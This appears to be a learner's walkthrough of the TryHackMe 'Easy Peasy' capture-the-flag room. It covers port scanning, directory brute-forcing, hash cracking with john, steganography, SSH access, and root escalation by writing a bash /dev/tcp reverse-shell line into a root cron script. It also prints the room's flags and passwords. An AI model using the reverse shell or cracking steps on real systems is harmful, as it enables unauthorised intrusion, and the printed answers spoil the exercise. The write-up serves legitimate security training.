# Easy Peasy Walkthrough
### Link
- https://tryhackme.com/room/easypeasyctf
---
### Taks 1 - Enumeration through Nmap

```
nmap -sC -sV -p- [IP]
```

**Result**

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
**Question**
#### How many ports are open?

**Answer**
###### 3

#### Whait is the version of nginx?

**Answer**
###### 1.16.1

#### What is runniong on the highest port? 

**Answer**
###### Apache

---
### Taks 2 - Compromising machine

#### Using GoBuster, find flag 1.

```
sudo  gobuster dir -u http://[IP] -w ~/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Result: /hidden

When we check in the browser, we found a jpg. I checked the source page but nothing fun.

I use one more time gobuster with the target: [IP]/hidden

```
sudo  gobuster dir -u http://[IP]/hidden -w ~/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Result: /whatever

Let's explore ^^ . We found a blank page so let's move to the source.

In the source page we found that: **ZmxhZ3tmMXJzN19mbDRnfQ==**

By using [CyberChef online](https://gchq.github.io/CyberChef), easy to obtain the flag.

**Answer**
###### flag{f1rs7_fl4g}

#### Further enumerate the machine, what is flag 2?

```
sudo  gobuster dir -u http://[IP]/hidden/whatever -w ~/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-medium.txt
```
In parallel, let's walk around the Apache and especially **http-robots.txt**

```
curl http://10.10.190.36:65524/robots.txt
```

Result:

```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

- First: check the hash type [tunnelsup.com](https://www.tunnelsup.com/hash-analyzer/)
- Second: Decode the hash [md5hashing](https://md5hashing.net/) to decrypt

*You can stop the gobuster* 

**Answer**
###### flag{1m_s3c0nd_fl4g}

#### Crack the hash with easypeasy.txt, What is the flag 3?
Let's check through the browser: http://10.10.190.36:65524/

We found the flag 3
**Answer**
###### flag{9fdafbd64c47471a8f54cd3fc64cd312}

#### What is the hidden directory?

Cehck the source page and serach the key word : **hidden**

```
hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu
```
To find the appropriate encoded basexx type. After few tests, I found the encoded system is base62 

**Answer**
###### /n0th1ng3ls3m4tt3r

#### Using the wordlist that provided to you in this task crack the hash. what is the password?

Explore the link: http://[IP]:65524/n0th1ng3ls3m4tt3r/

Check the source page

```
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
```

- First: Create a file and copy-paste this hash
- Second: Use john with the format **GOST**
```
john --format=GOST --wordlist=/media/sf_LOLO_Share/easypeasy.txt /media/sf_LOLO_Share/easy_peasy_hash.txt 
```
Result:
```
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)
1g 0:00:00:00 DONE (2021-12-07 13:04) 50.00g/s 185600p/s 185600c/s 185600C/s mypasswordforthatjob..daniela
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
**Answer**
###### mypasswordforthatjob

#### What is the password to login to the machine via SSH?

Pne more time check the source page of http://[IP]:65524/n0th1ng3ls3m4tt3r/. WE found the hash and this hash is attached to this jpg : **binarycodepixabay.jpg**

Download this jpg
```
wget http://[IP]:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```
Use **steghide** to analyze this jpg

```
steghide extract -sf [path]/binarycodepixabay.jpg
```
Use **mypasswordforthatjob** as passphrase

You extract the file : **secrettext.txt**

Let's check it

```
cat secrettext.txt

username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

First information : the username **boring**
Second: the password encoded. Copy-paste it in [CyberChef online](https://gchq.github.io/CyberChef)

**Answer**
###### iconvertedmypasswordtobinary	

#### What is the user flag?

SSH (**Remember the result of nmap to select the correct ssh port**)

```
ssh boring@10.10.190.36 -p 6498
```

```
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

We need to decode the flag. Interesting information is shared: *Rotated* 

We can assume the type could be something ROTxx.Copy-paste it in [CyberChef online](https://gchq.github.io/CyberChef) and test different type of ROT. The correct type is **ROT13**

**Answer**
###### flag{n0wits33msn0rm4l}

#### What is the root flag?

- First: Try *sudo -l*. Doesn't work.
- Second: check the crontab
```
cat /etc/crontab
```
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
- Third: Check **mysecretcronjob.sh**
```
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh
#!/bin/bash
# i will run as root
```
- Fourth: Start a listener
```
nc -nlvp 4444
```

- Fifth: let's create a reverse shell by updating the content of this file. Check the website [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Add this line with the appropriate infroamtion 
```
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```
- Sixth: Wait few second and that works ^^. If we check the content of **/root** with **ls** command, nothing appear. We need to use the option **-la** to also see hidden files.
```
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Dec  7 10:50 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
``` 
- Seventh: check **.root.txt**

**Answer**
###### 

